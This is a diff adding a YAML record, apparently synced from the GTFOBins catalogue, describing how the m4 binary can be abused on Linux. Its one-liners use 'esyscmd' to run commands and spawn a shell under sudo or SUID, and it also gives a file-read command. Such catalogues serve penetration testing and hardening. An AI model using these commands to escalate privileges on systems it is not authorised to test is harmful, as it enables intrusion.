@@ -1,0 +1,92 @@
+id: gtfobins/m4/command/sudo
+type: binary
+platform: linux
+name: m4
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- command-execution
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: echo 'esyscmd(/path/to/command)' | m4
+references:
+- https://gtfobins.github.io/gtfobins/m4/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        m4:
+          functions:
+            command:
+            - code: echo 'esyscmd(/path/to/command)' | m4
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+            file-read:
+            - binary: false
+              code: m4 /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            shell:
+            - code: echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
+              contexts:
+                sudo: null
+                suid:
+                  shell: true
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/m4/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: sudo
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:9db162461da78c8844ee2945619196fe6daa7e2b8aa1f46a2a1001fb14be494c
